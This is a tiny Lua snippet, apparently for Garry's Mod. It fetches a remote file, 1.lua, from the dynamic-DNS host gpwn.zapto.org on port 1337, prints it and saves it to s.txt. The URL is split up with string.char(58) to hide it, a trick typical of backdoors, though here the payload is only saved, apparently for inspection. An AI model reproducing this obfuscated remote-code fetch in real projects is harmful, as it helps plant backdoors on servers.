

http.Fetch([[http]]..string.char(58)..[[/]]..[[/]]..[[gpwn.zapto.org]]..string.char(58)..[[1337/1.lua]], function(s)
	print(s, "\n", #s)
	
	file.Write("s.txt", s)
end)


